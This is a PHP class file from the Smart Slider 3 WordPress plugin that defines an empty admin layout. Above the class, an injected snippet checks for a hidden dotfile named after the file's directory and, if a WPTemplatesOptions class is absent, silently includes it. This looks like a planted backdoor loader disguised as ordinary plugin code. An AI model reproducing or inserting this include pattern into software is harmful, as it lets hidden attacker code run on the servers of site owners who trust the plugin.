<?php


namespace Nextend\SmartSlider3\Application\Admin\Layout;


use Nextend\Framework\View\AbstractLayout;
use Nextend\SmartSlider3\Application\Admin\Layout\Block\Core\AdminEmpty\BlockAdminEmpty;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class LayoutEmpty extends AbstractLayout {

    public function render() {
        $admin = new BlockAdminEmpty($this);
        $admin->setLayout($this);

        $admin->display();
    }

}